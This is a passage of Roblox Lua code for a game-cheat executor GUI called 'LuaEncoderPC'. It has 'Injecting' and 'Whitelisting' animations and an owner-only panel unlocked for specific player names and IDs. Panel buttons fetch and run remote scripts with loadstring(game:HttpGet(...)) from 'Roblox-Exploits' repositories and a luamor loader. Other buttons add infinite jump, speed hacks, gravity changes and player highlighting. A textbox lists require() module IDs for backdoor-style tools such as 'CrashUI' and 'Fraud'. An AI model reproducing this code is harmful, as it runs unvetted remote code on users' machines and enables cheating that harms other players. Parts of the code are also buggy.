				script.Parent.ImageLabel.Visible = false
				script.Parent:TweenSize(UDim2.new(0, 0), "Out", "Sine", 0.2)
				wait(0.1) do
					script.Parent.Visible = false
				end
			end
		end
	end)
	
end;
task.spawn(C_85);
-- StarterGui.LuaEncoderPC.InjectingFrame.LocalScript
local function C_8c()
local script = G2L["8c"];
	task.spawn(function()
		local repeated = 0
		while script.Parent.Visible == true do
			repeat
				script.Parent.Desc.Text = "Injecting"
				wait(0.5)
				script.Parent.Desc.Text = "Injecting."
				wait(0.4)
				script.Parent.Desc.Text = "Injecting.."
				wait(0.75)
				script.Parent.Desc.Text = "Injecting..."
				wait(0.3)
			until repeated == 3
		end
	end)
	
	
	
	
	
	task.spawn(function()
		while task.wait(0.001) do
			wait(0.75)
			wait(0.4)
			wait(0.6)
			wait(0.75)
			wait(0.3)
			wait(0.3)
			wait(0.75)
			wait(0.4)
			wait(0.6)
			wait(0.75)
			wait(0.3)
			wait(0.3)
			wait(0.75)
			if script.Parent.Visible == true then
				wait(2)
				script.Parent.Title.Visible = false
				script.Parent.Desc.Visible = false
				script.Parent.ImageLabel.Visible = false
				script.Parent:TweenSize(UDim2.new(0, 0), "Out", "Sine", 0.2)
				wait(0.1) do
					script.Parent.Visible = false
				end
			end
		end
	end)
	
end;
task.spawn(C_8c);
-- StarterGui.LuaEncoderPC.AlrInjcFrame.LocalScript
local function C_93()
local script = G2L["93"];
	task.spawn(function()
		while task.wait(0.001) do
			if script.Parent.Visible == true then
				wait(2)
				script.Parent.Title.Visible = false
				script.Parent.Desc.Visible = false
				script.Parent.ImageLabel.Visible = false
				script.Parent:TweenSize(UDim2.new(0, 0), "Out", "Sine", 0.2)
				wait(0.1) do
					script.Parent.Visible = false
				end
			end
		end
	end)
	
end;
task.spawn(C_93);
-- StarterGui.LuaEncoderPC.ExecutedFrame.LocalScript
local function C_9a()
local script = G2L["9a"];
	task.spawn(function()
		while task.wait(0.001) do
			if script.Parent.Visible == true then
				wait(2)
				script.Parent.Title.Visible = false
				script.Parent.Desc.Visible = false
				script.Parent.ImageLabel.Visible = false
				script.Parent:TweenSize(UDim2.new(0, 0), "Out", "Sine", 0.1)
				wait(0.1) do
					script.Parent.Visible = false
				end
			end
		end
	end)
	
end;
task.spawn(C_9a);
-- StarterGui.LuaEncoderPC.ClearedFrame.LocalScript
local function C_a1()
local script = G2L["a1"];
	task.spawn(function()
		while task.wait(0.001) do
			if script.Parent.Visible == true then
				wait(2)
				script.Parent.Title.Visible = false
				script.Parent.Desc.Visible = false
				script.Parent.ImageLabel.Visible = false
				script.Parent:TweenSize(UDim2.new(0, 0), "Out", "Sine", 0.1)
				wait(0.1) do
					script.Parent.Visible = false
				end
			end
		end
	end)
	
end;
task.spawn(C_a1);
-- StarterGui.LuaEncoderPC.ExecutedThing.LocalScript
local function C_a8()
local script = G2L["a8"];
	task.spawn(function()
		while task.wait(0.001) do
			if script.Parent.Visible == true then
				wait(2)
				script.Parent.Title.Visible = false
				script.Parent.Desc.Visible = false
				script.Parent.ImageLabel.Visible = false
				script.Parent:TweenSize(UDim2.new(0, 0), "Out", "Sine", 0.2)
				wait(0.1) do
					script.Parent.Visible = false
				end
			end
		end
	end)
	
end;
task.spawn(C_a8);
-- StarterGui.LuaEncoderPC.Panel.OwnerMain
local function C_b4()
local script = G2L["b4"];
	--// Variables
	
	local gui = script.Parent.Parent
	local notinj = gui.NotInjF
	local exec = gui.ExecutedThing
	local att = gui.Frame.Values.Attached
	local fm = gui.Panel
	local gh = fm.Ghost
	local dlt = fm.DLT
	local cld = fm.Cloud
	local fe = fm.fe
	local ilu = fm.fel
	local kck = fm.kck
	local blade = fm.blade1
	local blade2 = fm.blade2
	local blade3 = fm.blade3
	local perigo = fm.perigo
	local speed = fm.speed
	
	
	
	--// Booleans
	
	fm.Draggable = true
	fm.Active = true
	
	--// Functions
	
	local function destroypart(partgiven)
		partgiven:Destroy()
	end
	
	perigo.MouseButton1Click:Connect(function() 
		local plr = game.Players.LocalPlayer
		local char = plr.Character or plr.CharacterAdded:Wait()
		
		local root = char.Humanoid
		
		destroypart(root)
	end)
	
	dlt.MouseButton1Click:Once(function() 
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local hum = char.Humanoid
	
		local caninfinitejump = true
		local doublejumpheight = 50
		hum:GetPropertyChangedSignal("Jump"):Connect(function()
			hum:ChangeState(Enum.HumanoidStateType.Jumping)
		end)
	end)
	
	gh.MouseButton1Click:Connect(function() 
		local grav = 196.2
		local maxgrav = 1096.2
		local gui = Instance.new("ScreenGui")
		gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		gui.ResetOnSpawn = false
		local gravtext = Instance.new("TextLabel")
		gravtext.Parent = gui
		gravtext.Position = UDim2.new(0,0,0,0)
		gravtext.Size = UDim2.new(0,200,0,50)
		gravtext.Text = "Gravity: "..grav
		local ic = Instance.new("TextButton")
		ic.Parent = gui
		ic.Position = UDim2.new(0,0,0,50)
		ic.Size = UDim2.new(0,200,0,50)
		ic.Text = "Increase Gravity"
		local dc = Instance.new("TextButton")
		dc.Parent = gui
		dc.Position = UDim2.new(0,0,0,100)
		dc.Size = UDim2.new(0,200,0,50)
		dc.Text = "Decrease Gravity"
		ic.MouseButton1Click:Connect(function()
			if grav < maxgrav then
				grav = grav + 10
				gravtext.Text = "Gravity: "..grav
				game.Workspace.Gravity = grav
			end
		end)
		dc.MouseButton1Click:Connect(function() 
			if grav > 10.2 then
				grav = grav - 10
				gravtext.Text = "Gravity: "..grav
				game.Workspace.Gravity = grav
			end
		end)
	end)
	
	cld.MouseButton1Click:Connect(function() 
		loadstring(game:HttpGet("https://raw.githubusercontent.com/nseinkkk/universal-script/main/hitbox"))()
	end)
	
	fe.MouseButton1Click:Connect(function() 
		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Dex-V2-10310"))()
	end)
	
	ilu.MouseButton1Click:Connect(function() 
		local players = game.Players
		local function highlightplayers()
			for _, player in ipairs(players:GetPlayers()) do
				local char = player.Character or player.CharacterAdded:Wait()
				if char and char:FindFirstChildOfClass("SelectionBox") == nil then
					local hum = char:FindFirstChildOfClass("Humanoid")
					if hum then
						local highlight = Instance.new("SelectionBox")
						highlight.Adornee = char
						highlight.Color3 = Color3.fromRGB(255, 0, 0)
						highlight.LineThickness = 0.05
						highlight.Parent = char
					end
				end
			end
		end
		local function playerremoving(player)
			player.Character:FindFirstChilOfClass("SelectionBox"):Destroy()
		end
		players.PlayerRemoving:Connect(playerremoving)
		highlightplayers()
		players.PlayerAdded:Connect(highlightplayers)
	end)
	
	kck.MouseButton1Click:Connect(function() 
		game.Players.LocalPlayer:Kick("Used a script that destroys something or your lagging")
	end)
	
	blade.MouseButton1Click:Connect(function() 
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/autoparry.lua"))()
	end)
	
	blade2.MouseButton1Click:Connect(function() 
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/BladeBallV3.lua"))()
	end)
	
	blade3.MouseButton1Click:Connect(function() 
		loadstring(game:HttpGet("https://api.luamor.net/files/v3/loaders/ab6906cda6641c69a5f3a6c0c2ad6d80.lua"))()
	end)
	
	speed.MouseButton1Click:Connect(function() 
		local function isNumber(str) 
			if tonumber(str) ~= nil or str == 'inf' then 
				return true 
			end 
		end 
		local tspeed = 1 
		local hb = game:GetService("RunService").Heartbeat 
		local tpwalking = true 
		local player = game:GetService("Players") 
		local lplr = player.LocalPlayer 
		local chr = lplr.Character 
		local hum = chr and chr:FindFirstChildWhichIsA("Humanoid") 
		while tpwalking and hb:Wait() and chr and hum and hum.Parent do 
			if hum.MoveDirection.Magnitude > 0 then 
				if tspeed and isNumber(tspeed) then 
					chr:TranslateBy(hum.MoveDirection * tonumber(tspeed)) 
				else 
					chr:TranslateBy(hum.MoveDirection) 
				end 
			end 
		end
	end)
	
	--[[ End ]]--
end;
task.spawn(C_b4);
-- StarterGui.LuaEncoderPC.ownerpanel.PanelMain
local function C_d7()
local script = G2L["d7"];
	local button = script.Parent
	local panel = script.Parent.Parent.Panel
	
	local plr = game.Players.LocalPlayer
	
	if plr.Name == "DENISEPV1" and plr.UserId == 1752576503 or plr.Name == "gabrielveiga516g" or plr.Name == "ussoscript" or plr.UserId == 2230179991 then
		button.Visible = true
	else
		panel:Destroy()
		button:Destroy()
	end
	
	
	button.MouseButton1Click:Connect(function() 
		panel.Visible = not panel.Visible
	end)
end;
task.spawn(C_d7);
-- StarterGui.LuaEncoderPC.backhub.HubMain
local function C_dc()
local script = G2L["dc"];
	--// Variables
	
	local gui = script.Parent.Parent
	local notinj = gui.NotInjF
	local exec = gui.ExecutedThing
	local att = gui.Frame.Values.Attached
	local fm = gui.backhub
	
	
	--// Booleans
	
	fm.Draggable = true
	fm.Active = true
	
	--// Functions
	
	
end;
task.spawn(C_dc);
-- StarterGui.LuaEncoderPC.backhub.ScrollingFrame.TextBox.LocalScript
local function C_e1()
local script = G2L["e1"];
	while task.wait() do
		script.Parent.Text = "Dex = require(4786706026):dex('%username%') \n Minecraft = require(5820669639)('%username%') \n CrashUI = require(6053693667).Crashexe('%username%') \n R6 = require(4585652241).load('%username%') \n KillBot = require(3904000898).load('%username%') \n YingYang = require(4875966146).load('%username%') \n HackerMan = require(4876105392).load('%username%') \n SakuraHub = require(5536569504):SH('%username%') \n Fraud = require(4952179933).Fraud('%username%') \n F3X = require(4869378421).F3X('%username%') \n UndetectedHub = require(5673170715).Leak('%username%') \n PoliceAI = require(7163976217).VK('%username%') \n TankAI = require(7203746402).tonk('%username%') \n JuggernautAI = require(7486656912).Juggernaut('%username%')"
	end
end;
task.spawn(C_e1);
-- StarterGui.LuaEncoderPC.WhitelistingFrame.LocalScript
local function C_e4()
local script = G2L["e4"];
	task.spawn(function()
		local repeated = 0
		while script.Parent.Visible == true do
			repeat
				script.Parent.Desc.Text = "Whitelisting"
				wait(0.5)
				script.Parent.Desc.Text = "Whitelisting."
				wait(0.4)
				script.Parent.Desc.Text = "Whitelisting.."
				wait(0.75)
				script.Parent.Desc.Text = "Whitelisting..."
				wait(0.3)
			until repeated == 3
			task.wait()
		end
	end)
	
	
	
	
	
	task.spawn(function()
		while task.wait(0.001) do
			wait(0.75)
			wait(0.75)
			if script.Parent.Visible == true then
				wait(2)
				script.Parent.Title.Visible = false
				script.Parent.Desc.Visible = false
				script.Parent.ImageLabel.Visible = false
				script.Parent:TweenSize(UDim2.new(0, 0), "Out", "Sine", 0.2)
				wait(0.1) do
					script.Parent.Visible = false
				end
			end
		end
	end)
	
end;
task.spawn(C_e4);

return G2L["1"], require;
